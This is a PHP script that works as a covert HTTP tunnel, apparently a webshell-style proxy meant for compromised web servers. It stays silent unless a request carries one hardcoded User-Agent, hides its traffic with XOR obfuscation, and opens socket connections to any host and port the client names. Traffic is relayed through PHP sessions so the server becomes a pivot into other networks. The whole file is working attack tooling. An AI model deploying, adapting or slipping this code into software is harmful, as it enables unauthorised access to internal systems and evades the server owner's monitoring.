<?php
error_reporting(E_ERROR | E_PARSE);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
ini_set('always_populate_raw_post_data', -1);

// bypass session lock
ini_set('session.use_only_cookies', false);
ini_set('session.use_cookies', false);
ini_set('session.use_trans_sid', false);
ini_set('session.cache_limiter', null);
if (array_key_exists('PHPSESSID', $_COOKIE)) {
    session_id($_COOKIE['PHPSESSID']);
} else {
    session_start();
    setcookie('PHPSESSID', session_id());
    session_write_close();
}

// disable output buffering
@ini_set('zlib.output_compression', 0);
ob_implicit_flush(true);
while (ob_get_level()) {
    ob_end_clean();
}

if (version_compare(PHP_VERSION, '5.4.0', '>=')) @http_response_code(200);

function check_auth()
{
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    if ($ua != 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3') {
        return false;
    }
    if ($_SERVER['CONTENT_TYPE'] == 'application/plain') {
        $read_data = file_get_contents('php://input', 0, null, 0, 32);
        echo $read_data;
        return false;
    }
    return true;
}

function add_client_data($client_id, $data)
{
    $exist = false;
    session_start();
    if (isset($_SESSION[$client_id . '_ok'])) {
        $exist = true;
        $_SESSION[$client_id . '_buf'] .= $data;
    }
    session_write_close();
    return $exist;
}


function close_client_info($client_id)
{
    session_start();
    if (isset($_SESSION[$client_id . '_ok'])) {
        $_SESSION[$client_id . '_ok'] = false;
    };
    session_write_close();
}

function init_client_info($client_id)
{
    session_start();
    $_SESSION[$client_id . '_buf'] = '';
    $_SESSION[$client_id . '_ok'] = true;
    session_write_close();
}

function process_unary()
{
    $body = file_get_contents('php://input');
    $data_map = unmarshal($body);
    $client_id = $data_map['id'];
    $actions = $data_map['ac'];
    if (strlen($actions) != 1) return;
    $action = ord($actions[0]);

    if ($action == 0x02) {
        close_client_info($client_id);
        return;
    } elseif ($action == 0x01) {
        $exist = add_client_data($client_id, $data_map['dt']);
        if (!$exist) {
            echo marshal(new_del());
        }
        return;
    }

    if ($action != 0x00) return;
    header('X-Accel-Buffering: no');
    header('Content-Type: application/octet-stream');
    header("Connection: Keep-Alive");
    set_time_limit(0);

    $host = $data_map['h'];
    $ip = gethostbyname($host);
    $port_str = trim($data_map['p']);
    if ($port_str == '0') {
        $port_str = isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : '80';
    }
    $port = intval($port_str);

    $remote_sock = @fsockopen($ip, $port, $errno, $errstr, 3);
    if ($remote_sock) {
        stream_set_blocking($remote_sock, false);
//        ignore_user_abort(true);
        $read_from = $remote_sock;
        init_client_info($client_id);
        echo marshal(new_status(0x00));
    } else {
        echo marshal(new_status(0x01));
        return;
    }

    $ok_key = $client_id . '_ok';
    $buf_key = $client_id . '_buf';

    $last_buf_time = time();
    while (!feof($read_from)) {
        $remote_data = fread($read_from, 32 * 1024);
        if ($remote_data === false) {
            break;
        }
        if (strlen($remote_data) !== 0) {
            echo marshal(new_data($remote_data));
        }

        session_start();
        if (!isset($_SESSION[$ok_key]) || $_SESSION[$ok_key] !== true) {
            unset($_SESSION[$ok_key]);
            unset($_SESSION[$buf_key]);
            session_write_close();
            break;
        }
        if (strlen($_SESSION[$buf_key]) !== 0) {
            $last_buf_time = time();
            fwrite($read_from, $_SESSION[$buf_key]);
            $_SESSION[$buf_key] = '';
        }

        // compute client count
        $client_count = 0;
        foreach ($_SESSION as $key => $value) {
            if (substr($key, -3) == '_ok') {
                $client_count++;
            }
        }
        session_write_close();

        if (time() - $last_buf_time > 60) {
            break;
        }
        usleep(50000);
    }

    session_start();
    unset($_SESSION[$ok_key]);
    unset($_SESSION[$buf_key]);
    session_write_close();
    fclose($read_from);
    echo marshal(new_del());
}

function marshal($m)
{
    $buf = '';
    foreach ($m as $key => $value) {
        $buf .= chr(strlen($key)) . $key . pack('N', strlen($value)) . $value;
    }
    $xor_key = chr(mt_rand(0, 255));
    $data = '';
    for ($i = 0; $i < strlen($buf); $i++) {
        $data .= chr(ord($buf[$i]) ^ ord($xor_key));
    }
    return pack('N', strlen($data)) . $xor_key . $data;
}

function unmarshal($body)
{
    $len = unpack('N', substr($body, 0, 4))[1];
    $xor = ord(substr($body, 4, 1));
    $data = substr($body, 5);
    if ($len > 1024 * 1024 * 32) {
        throw new Exception('invalid len');
    }
    if (strlen($data) != $len) {
        throw new Exception('invalid data');
    }
    $decoded = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $decoded .= chr(ord($data[$i]) ^ $xor);
    }
    $m = array();
    $i = 0;
    while ($i < strlen($decoded) - 1) {
        $k_len = ord($decoded[$i]);
        $i++;
        if ($k_len < 0 || $i + $k_len >= strlen($decoded)) break;
        $key = substr($decoded, $i, $k_len);
        $i += $k_len;
        if ($i + 4 >= strlen($decoded)) break;
        $v_len = unpack('N', substr($decoded, $i, 4))[1];
        $i += 4;
        if ($v_len < 0 || $i + $v_len > strlen($decoded)) break;
        $value = substr($decoded, $i, $v_len);
        $i += $v_len;
        $m[$key] = $value;
    }
    return $m;
}

function new_del()
{
    return array('ac' => chr(0x02));
}

function new_status($b)
{
    return array('s' => chr($b));
}

function new_data($data)
{
    return array('ac' => chr(0x01), 'dt' => $data);
}

if (check_auth()) {
    try {
        process_unary();
    } catch (Exception $ex) {
    }
}